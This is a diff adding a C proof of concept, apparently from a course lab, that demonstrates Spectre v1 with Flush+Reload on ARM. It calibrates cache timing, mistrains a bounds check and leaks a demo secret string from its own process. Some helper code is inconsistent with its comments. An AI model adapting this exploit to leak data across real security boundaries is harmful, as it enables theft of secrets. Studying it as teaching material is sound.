@@ -1,0 +1,248 @@
+#include "../../color.h"
+#include <assert.h>
+#include <ctype.h>
+#include <inttypes.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "timer.h"
+
+#define PAGE_SIZE 16384
+#define CACHE_LINE_SIZE 128
+#define SYMBOL_CNT (1 << (sizeof(char) * 7))
+#define ISB() __asm__ __volatile__("isb" ::: "memory")
+
+// The secret information
+const char *secret = "The cake is a lie!";
+
+uint8_t* flush_buffer;
+
+
+// Evict caches by reading through a large buffer bigger than LLC.
+// Tune EVICT_SIZE if your Mac has an unusually large LLC.
+#define EVICT_SIZE (64 * 1024 * 1024)
+#define STRIDE 128                      // cache line-ish
+static unsigned char *evict_buf = NULL;
+
+static inline void init_eviction_buffer(void) {
+    if (!evict_buf) {
+        // posix_memalign for line alignment
+        if (posix_memalign((void**)&evict_buf, 64, EVICT_SIZE) != 0 || !evict_buf) {
+            perror("evict buffer alloc");
+            exit(1);
+        }
+        memset(evict_buf, 0xA5, EVICT_SIZE);
+    }
+}
+
+static inline void evict_caches(void) {
+    volatile unsigned int acc = 0;
+    for (size_t i = 0; i < EVICT_SIZE; i += STRIDE) acc += evict_buf[i];
+    (void)acc;
+}
+
+static inline void flush_line(void *p) {
+    (void)p; // not line-selective on ARM; we just evict broadly
+    init_eviction_buffer();
+    evict_caches();
+}
+
+void _maccess(uint8_t* data) {
+    uint32_t temp;
+    __asm__ __volatile__ (
+        "ldr %w0, [%1]" // Load register %0 from the memory address in %1
+        : "=r" (temp) // Output: 'value' in a general-purpose register
+        : "r" (data)    // Input: 'ptr' in a general-purpose register
+        : "memory"     // Clobber: indicates memory has been accessed
+    );
+}
+
+void _mm_mfence(void) {
+    // DMB SY ensures that all memory accesses before the DMB instruction
+    // are completed before any memory accesses after the DMB instruction.
+    // The "SY" option makes it a full system-wide memory barrier.
+    __asm__ __volatile__("" ::: "memory");
+}
+
+static inline void _mm_clflush(void *addr) {
+    __asm__ __volatile__("DC CIVAC, %0" :: "r" (addr) : "memory");
+}
+
+uint32_t _time_maccess(void* ptr) {
+  timer_init(1, 1);
+  ISB();
+  uint64_t t0 = timer_now();
+  ISB();
+  // volatile read to ensure the access happens
+  volatile unsigned char tmp = *(volatile unsigned char *)ptr;
+  (void)tmp;
+  ISB();
+  uint64_t t1 = timer_now();
+  ISB();
+  timer_shutdown();
+  return t1 - t0;
+}
+
+// ====== A set of helper functions ======
+// Calibrate the threshold for cache misses/hits
+uint64_t calibrate_latency() {
+    if (timer_init(true, 0.2) != 0) {
+        fprintf(stderr, "timer_init failed\n");
+        return 1;
+    }
+
+    const int reps = 20000;
+    unsigned char *buf = NULL;
+    if (posix_memalign((void**)&buf, 64, PAGE_SIZE) != 0 || !buf) {
+        perror("alloc");
+        return 1;
+    }
+    memset(buf, 0xA5, PAGE_SIZE);
+    volatile unsigned char sink;
+
+    // Warm cache access
+    sink = buf[0];
+
+    // Measure cached accesses
+    uint64_t sum_ticks_cached = 0;
+    for (int i = 0; i < reps; ++i) {
+        uint64_t t = timer_time_maccess(&buf[0]);
+        sum_ticks_cached += t;
+    }
+
+    // Measure flushed/evicted accesses
+    uint64_t sum_ticks_evicted = 0;
+    for (int i = 0; i < reps; ++i) {
+        flush_line(&buf[0]);
+        uint64_t t = timer_time_maccess(&buf[0]);
+        sum_ticks_evicted += t;
+    }
+
+    double avg_cached_ns  = timer_ticks_to_ns(sum_ticks_cached)  / reps;
+    double avg_evicted_ns = timer_ticks_to_ns(sum_ticks_evicted) / reps;
+
+    free((void*)buf);
+
+    uint64_t threshold = ((2 * avg_evicted_ns) + avg_cached_ns) / 3;
+    printf("Avg. hit latency: %.2f, Avg. miss latency: %.2f, Threshold: %" PRIu64 "\n",
+           avg_cached_ns, avg_evicted_ns, threshold);
+    timer_shutdown();
+    return threshold;
+}
+
+// Branchless select based on the predicate (covered in class)
+ size_t cselect(size_t T, size_t F, bool pred) {
+    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
+    return (T & mask) | (F & ~mask);
+    // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
+}
+
+// Flush "N" lines from address "start" with a stride of "stride"
+void flush_lines(uint8_t *pages, size_t stride) {
+    for(uint16_t i = 0; i < SYMBOL_CNT; i++) {
+        flush_line(&pages[i * stride]);  // Flush the actual probe array
+    }
+}
+
+// Find the most hit cacheline and safely decode its character
+void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
+    uint64_t most_hits = 0, scd_most_hits = 0;
+    unsigned char raw_c = '\0', scd_raw_c = '\0';
+    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
+        if (most_hits < hits[i]) {
+            scd_most_hits = most_hits;
+            scd_raw_c = raw_c;
+
+            most_hits = hits[i];
+            raw_c = i;
+        }
+    }
+
+    *c = isprint(raw_c) ? raw_c : '?';
+    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
+    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3llu); "
+           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3llu)\n",
+           *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
+}
+// ====== End of helper functions ======
+
+// ====== Below is a common Spectre "PoC" ======
+uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
+volatile size_t array_size = 8;
+
+int naive_victim(uint8_t *pages, size_t idx, size_t stride) {
+    if (idx < array_size) {
+        volatile uint8_t temp = pages[array[idx] * stride];
+    }
+    return 0;
+}
+
+
+void naive_attacker() {
+    uint64_t threshold = calibrate_latency();
+    printf("-----------------------------------------\n");
+    uint64_t hits[SYMBOL_CNT] = { 0 };
+    char buf[100] = { '\0' };
+
+    // Pages for Flush+Reload
+    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (pages == MAP_FAILED) {
+        perror("mmap");
+        return;
+    }
+    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
+    printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);
+    size_t stride = PAGE_SIZE;
+
+    size_t malicious_index;
+    if((uintptr_t)secret > (uintptr_t)array) malicious_index = (uintptr_t)secret - (uintptr_t)array;
+    else malicious_index = (uintptr_t)array - (uintptr_t) secret;
+    printf("Secret address: %p, Array address: %p\n", secret, array);
+    printf("The malicious index is %p-%p=%#lx\n", secret, array,
+           malicious_index);
+    printf("-----------------------------------------\n");
+    //printf("here0");
+    for (size_t c = 0; c < strlen(secret); c++) {
+        for (size_t r = 0; r < 10; r++) {
+            for (size_t t = 0; t < 16; t++) {
+                bool is_attack = (t % 8 == 8 - 1);
+                size_t index = cselect(malicious_index + c, c - malicious_index, (uintptr_t)secret > (uintptr_t)array);                
+                index = cselect(index, 0, is_attack);
+                //printf("here1");
+                flush_lines(pages, stride);
+                //printf("here2");
+                flush_line((void *)&array_size);
+                _mm_mfence();
+                naive_victim(pages, index, stride);
+            }
+
+            for (size_t i = 0; i < SYMBOL_CNT; i++) {
+                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
+                uint8_t *ptr = pages + stride * idx;
+                hits[idx] += _time_maccess(ptr) < threshold;
+            }
+        }
+
+        // Save the recovered character
+        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
+        memset(hits, 0, sizeof(hits));
+    }
+
+    printf("Recovered secret: \"%s\"\n", buf);
+    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
+    return;
+}
+
+int main(int argc, char **argv) {
+    flush_buffer = (uint8_t*)malloc(256 * PAGE_SIZE);
+
+    if (argc == 2 && strcmp(argv[1], "naive") == 0) {
+        printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
+        naive_attacker();
+    }
+    return 0;
+}
